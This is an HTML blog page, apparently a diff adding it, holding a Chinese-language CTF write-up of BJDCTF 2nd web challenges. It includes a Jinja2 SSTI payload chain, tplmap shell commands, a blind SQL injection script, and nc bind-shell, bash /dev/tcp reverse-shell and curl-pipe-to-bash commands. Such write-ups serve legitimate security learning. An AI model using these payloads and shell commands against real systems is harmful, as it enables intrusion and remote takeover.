@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="web[BJDCTF 2nd]fake google知识点  ssti进去直接提示了ssti。知道了ssti就直接去查资料找payload了。使用的框架是python的jinja2，找找看大佬门的解题思路。传送门传送门看完绝对会做了。一般来说思路如下:利用现有类找到基类。比如&amp;#39;&amp;#39;.__class__就是一个str类。我们还可以通过这个类找到它的基类。也就是object类。pytho">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF-2nd-web">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;23&#x2F;BJDCTF-2nd-web&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="web[BJDCTF 2nd]fake google知识点  ssti进去直接提示了ssti。知道了ssti就直接去查资料找payload了。使用的框架是python的jinja2，找找看大佬门的解题思路。传送门传送门看完绝对会做了。一般来说思路如下:利用现有类找到基类。比如&amp;#39;&amp;#39;.__class__就是一个str类。我们还可以通过这个类找到它的基类。也就是object类。pytho">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;24&#x2F;l9Idm7RoXr3PaqM.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;24&#x2F;zBrgh81AxbjpnKt.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;25&#x2F;TSfRAr37KC2xEcP.png">
+<meta property="og:updated_time" content="2020-04-12T15:01:39.084Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;24&#x2F;l9Idm7RoXr3PaqM.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/23/BJDCTF-2nd-web/"/>
+
+
+
+
+
+  <title>BJDCTF-2nd-web | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/23/BJDCTF-2nd-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BJDCTF-2nd-web</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-23T12:04:33+08:00">
+                2020-03-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>知识点</p>
+<ul>
+<li>ssti<br>进去直接提示了ssti。<br>知道了ssti就直接去查资料找payload了。<br>使用的框架是python的jinja2，找找看大佬门的解题思路。<br><a href="https://zhuanlan.zhihu.com/p/93746437" target="_blank" rel="noopener">传送门</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">传送门</a><br>看完绝对会做了。<br>一般来说思路如下:<br>利用现有类找到基类。<br>比如<code>&#39;&#39;.__class__</code><br>就是一个str类。我们还可以通过这个类找到它的基类。也就是object类。<br>python的所有类都是从这个类继承来的。所有这个类有非常多的子类。<br>从这些子类当作寻找到我们需要的类，调用类的方法来完成我们的目的就是一次利用。<br>做这道题的时候我一直花费时间在找重载过的<strong>init</strong>类上(见前文的二向箔安全一篇)，最后写脚本跑了貌似还是没找到和文章一样的类。<br>最后又去找了另一篇文章(先知社区那篇)。最后没有拘泥于<strong>init</strong>类直接利用了起来。<br>解题步骤如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__calss———— //返回一个str类。</span><br><span class="line">&apos;&apos;.__class__.__base__ 返回这个类的所有基类。找到object类。这里假设是2</span><br><span class="line">&apos;&apos;.__class__.__base__[2].__subclasses__() // 这里选中了基类object，然后调用__subclasses__()方法返回这个类的所有子类。</span><br><span class="line">&apos;&apos;.__class__.__base__[2].__subclasses__()[117]// 假设os类是17，这里就表示os这个类了</span><br><span class="line">&apos;&apos;.__class__.__base__[2].__subclasses__()[117].__init__.__globals__ //用__init__初始化类。然后调用__globals__来查看类的所有方法及变量。</span><br><span class="line">&apos;&apos;.__class__.__base__[2].__subclasses__()[117].__init__.__globals__[&apos;popen&apos;](&apos;od /flag&apos;).read() //最后选择了popen()函数来进行shell操作。似乎不能直接cat读到/flag的内容最后选择了od -c /flag的方式来读了flag</span><br></pre></td></tr></table></figure>
+赛后认真看了一下tplmap的使用。发现这道题其实可以直接秒的。不过这次自己动手学习还是学到了非常多，知道了原理再上工具也算是不留遗憾了。<br>payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tplmap.py -u url</span><br><span class="line">tplmap.py --os-shell -u url</span><br></pre></td></tr></table></figure>
+直接cat /flag就行。这里似乎直接拿到了更高的权限。<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2>知识点</li>
+<li>thinkphp 5.0.23代码执行漏洞<br>这道题考的是框架的知识点，由于见过的题目太少一开始无从下手，直到提示了版本的问题才想到要去搜cve。<br>搜了一个payload，高高兴兴放上去发现不对(当时我放的5.0.15)的，报错了。但是至少知道了版本是5.0.23<br>直接去搜thinkphp 5.0.23,出来很多利用文章，随便试一个。发现报错(其实命令已经执行，但是没开调试模式)<br>于是我以为自己思路错了，又去再度找资料浪费了不少时间。最后百思不得其解，决定抓包看看结果是否有不同。<br>bp一抓包。比较了一下命令执行结果。果然有所不同。仔细看，命令其实还是执行了的。于是执行ls /.cat /flag拿到flag。<br>这道题其实也是可以一把梭的，对于知道知识点的人来说肯定是秒题的，打比赛的时候就是复制一个payload的事情。<br>这里附上参考文章。<br><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">传送门</a><br><a href="https://y4er.com/post/thinkphp5-rce/" target="_blank" rel="noopener">rec总结</a><h2 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h2>知识点</li>
+<li>cookie改动</li>
+<li>仔细<br>进去就是一个破解页面。提示我们给一个url，会自动破解。<br>没思路，直接扫后台看源码，发现了一个test.php页面。<br>点进去是管理员登录的页面。我二话不说就直接写脚本跑起来了。<br>跑了好久发现不对劲。想着前面不是有个要我们给url破解的页面吗？<br>就把这个url的页面放进去看了看。发现好像跑得很慢。我让他跑了一小时都没跑出来。<br>到这里我以为我思路错误。然后就不知道怎么弄了。<br>过了一会放出了第一个hint。提示小饼干，那不就是cookie了吗？由于一开始没注意提交url后会增加一个cookie值，没看出什么门道。<br>到后来发现提交url后会多一个cookie值，一看好像是base64编码的。解码一下，一看像是时间戳，没搞懂什么。<br>我就随便改了改cookie。再刷新，一看，哇。破解了百分之99多了。估计这回对了。<br>然后按耐不住点了check。ok，提示我失败。我再来一次。这回等了有一分多钟。check。好吧，还是失败了。<br>我又以为我错了。(这里建议直接放一秒给密码)。又去看其他题去了。葬送一血。<br>后来看到大家都做出来了，不甘心又去改了cookie试了，这回等了有五六分钟吧。check，出来了。<br>一个av号(b站的)，直接上去找flag，完成。<br>说实话这题感觉出得有点，脑洞，有同学吐槽不知道在干嘛。<br>其实静下心来想想，这道题还是可以学到东西的。利用程序自身来破解自身，这不就是一种渗透思维吗？<br>而且这道题还是扩宽了思维的，当你没有思路的时候，你是否尝试了每一个参数的提交？是否看了返回的数据？是否关注返回的cookie？<br>乍看之下好像完全没有学到什么，但是仔细想想，这也许更接近实战一些吧，毕竟，渗透的时候也不会有人告诉你这网站哪里有洞不是吗？<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2>知识点</li>
+<li>反序列化</li>
+<li>.git泄露</li>
+<li>xss<br>也是一进去啥思路没有，那就一贯的扫后台，看源码。<br>扫到了.git泄露，但是内容只有两句话,<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;yds_is_so_beautiful&apos;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>
+一开始题目不叫xss之光。我就不知道要考什么，以为是考反序列化调用魔术方法的地方。<br>但是这里也没有可以利用的魔术方法啊<br>难道说是考echo一个对象的时候<strong>tostring魔术方法？<br>如果真的是这个考点那某个定义好的类的</strong>tostring方法肯定有漏洞，找了一下，发现没有这方面的文章。<br>估计是想错了，直到后面提示了xss。打出来就行。于是就尝试序列化一个xss语句打上去。<br>打上去发现真的可以。就去buu上一个xss钓鱼的站注册了一下尝试利用。<br>后来实际打的时候发现不用这么复杂，直接打出xss，查看cookie。里面就是flag了。<h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2>知识点</li>
+<li>各种header头</li>
+<li>js跳转<br>进去就是一个登陆页面。一时间以为是sql。但是sql出有题目了。<br>登录上去一看。会回显输入的内容，以为是xss。<br>但是xss和.git也考过了。<br>ssti也考过了<br>还有啥呢，感觉像是xxe？<br>试了一下，不行。<br>思路断掉了。<br>后来f12，查看完整的一次登录请求。<br>发现了如下页面<br><img src="https://i.loli.net/2020/03/24/l9Idm7RoXr3PaqM.png" alt="Snipaste_2020-03-24_21-43-44.png"><br>发现是302，那就抓包看看。<br><img src="https://i.loli.net/2020/03/24/zBrgh81AxbjpnKt.png" alt="Snipaste_2020-03-24_21-46-20.png"><br>发现了这个页面，然后访问。<br>接下来的考点都可以在这个页面找到答案。<br><a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5" target="_blank" rel="noopener">传送门</a><br>这道题再次警醒我，没思路的时候一定要注意抓包看看请求，看看响应包，到底有什么内容，从中找到解题的思路。<h2 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h2>脑洞题<br>进去就是一个漫画图片，没思路，老样子，f12看看，没啥。<br>扫后台，没啥。<br>看看源码，发现了两个因此的id。一看就是16进制。再看是偶数个。估计没跑了，<br>直接转字符串。发现是Po.php。这一步几乎刚放题我就发现了。但是一直到七八小时之后我才反应过来是根据元素周期表来解题。<br>这里Po.php是一个.，一时间没反应过来。最后实在不甘心，把所有的元素名拿来跑了一遍。拼出来一个php页面。访问拿到flag。<h1 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h1><h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2>知识点</li>
+<li>bool盲注<br>这道题说起来非常可惜。已经发现了注入方法，但是思路不对，导致解题失败。<br>这道题过滤了’,”,;,select,and等待。<br>一开始看到’想着绕嘛，不绕怎么执行我们的语句。<br>编码不行，后来灵机一动，想到了\转义绕过。果然成功了。<br>接下来我就陷入了想办法不使用select来爆表名的怪圈。堆叠也不行。过滤了;<br>在此浪费了大量时间，只爆出来数据库名。实际上本题只要求破解出密码登录即可。由于做题的时候没有扫后台没发现这个hint，解题失败。<br>这里甚至直接给了sql语句提示\绕过(wtcl)。而且给出了密码字段名password。<br>官方payload如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">// P3rh4ps tql!!!</span><br><span class="line">url=&apos;http://39.106.207.66:2333/&apos;</span><br><span class="line">def str2hex(string):</span><br><span class="line">    c=&apos;0x&apos;</span><br><span class="line">    a=&apos;&apos;</span><br><span class="line">    for i in string:</span><br><span class="line">        a+=hex(ord(i))</span><br><span class="line">    return c+a.replace(&apos;0x&apos;,&apos;&apos;)</span><br><span class="line">alphabet = [&apos;!&apos;,&apos;[&apos;,&apos;]&apos;,&apos;&#123;&apos;,&apos;&#125;&apos;,&apos;_&apos;,&apos;/&apos;,&apos;-&apos;,&apos;&amp;&apos;,&quot;%&quot;,&apos;#&apos;,&apos;@&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;g&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;,&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;G&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;,&apos;0&apos;,&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=&apos;^&apos;</span><br><span class="line">for i in range(0,20):</span><br><span class="line">    for y in alphabet:</span><br><span class="line">        tmp=flag+y</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;: &quot;P3rh4ps\\&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;||password regexp binary &#123;&#125;#&quot;.format(str2hex(tmp))</span><br><span class="line">        &#125;</span><br><span class="line">   #     print(data[&apos;password&apos;])</span><br><span class="line">        x=requests.session()</span><br><span class="line">        if &apos;BJD needs&apos; in x.post(url,data=data).text:</span><br><span class="line">        #    print(x.post(url,data=data).text)</span><br><span class="line">            flag=tmp</span><br><span class="line">            break</span><br><span class="line">    print(flag.replace(&quot;^&quot;,&quot;&quot;))</span><br></pre></td></tr></table></figure>
+原理就是根据正则来一位一位的匹配。最后匹配出完整数据。值得一说的是，适用了regexp binary来匹配。<br>因为单引号过滤掉了，所以用这个法子来匹配才能成功。</li>
+</ul>
+<h2 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h2><p>知识点</p>
+<ul>
+<li>正/反向getshell<br>提示了.swp文件泄露。<br>注意.swp是隐藏文件。所有访问的时候要.index.php.swp才能下载到。<br>下载下来之后放kali里面去vi -r .index.php.swp修复看到原内容。<br><img src="https://i.loli.net/2020/03/25/TSfRAr37KC2xEcP.png" alt="Snipaste_2020-03-25_09-26-08.png"><br>发现过滤了不少命令。执行dir之类的命令看不到回显。&gt;也被过滤了。<br>直接写shell拿flag好像不行(我是想不出来)。<br>这里有监听端口和反弹shell两种解法。(我了解到的)</li>
+</ul>
+<hr>
+<p>先说正向的。<br>首先post如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=nc -lvp 2333 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p>这样就能在靶机上监听2333端口。解释一下各参数的意思<br>-l 启用监听模式<br>-v 显示命令执行的过程<br>-p 指明端口号<br>-e 连接成功后将程序转到exec模式，这里指定了/bin/bash目录，也就是说我们可以执行任意命令了。<br>随后在攻击机上用nc 靶机ip 2333  连上<br>ls /       发现假flag。<br>find / -name flag找到flag。<br>cat读取即可。</p>
+<hr>
+<p>反向弹shell。首先在服务器上创建弹shell的语句写入test.txt文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>关于这条命令的解析，可以看这里<br><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">传送门</a><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">传送门</a><br>把ip改成你攻击机的ip。然后在攻击机上用nc -lvp 2333监听2333端口，等待靶机连接。<br>随后post如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://你的攻击机名/test.txt|bash</span><br></pre></td></tr></table></figure>
+<p>首先会去下载test.txt文件的内容。然后将内容作为bash命令执行一遍。<br>于是我们写入的弹shell语句就得意执行。此时回到攻击机发现靶机连上来了。<br>然后就是相同的操作读flag。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/16/buuctf-wp2/" rel="next" title="buuctf-wp2">
+                <i class="fa fa-chevron-left"></i> buuctf-wp2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/11/buuctf-wp3/" rel="prev" title="buuctf-wp3">
+                buuctf-wp3 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-fake-google"><span class="nav-number">1.1.</span> <span class="nav-text">[BJDCTF 2nd]fake google</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-old-hack"><span class="nav-number">1.2.</span> <span class="nav-text">[BJDCTF 2nd]old-hack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-Schrödinger"><span class="nav-number">1.3.</span> <span class="nav-text">[BJDCTF 2nd]Schrödinger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-xss之光"><span class="nav-number">1.4.</span> <span class="nav-text">[BJDCTF 2nd]xss之光</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-假猪套天下第一"><span class="nav-number">1.5.</span> <span class="nav-text">[BJDCTF 2nd]假猪套天下第一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-elementmaster"><span class="nav-number">1.6.</span> <span class="nav-text">[BJDCTF 2nd]elementmaster</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现部分"><span class="nav-number">2.</span> <span class="nav-text">复现部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-简单注入"><span class="nav-number">2.1.</span> <span class="nav-text">[BJDCTF 2nd]简单注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-duangShell"><span class="nav-number">2.2.</span> <span class="nav-text">[BJDCTF 2nd]duangShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.3.</span> <span class="nav-text"></span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">112.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
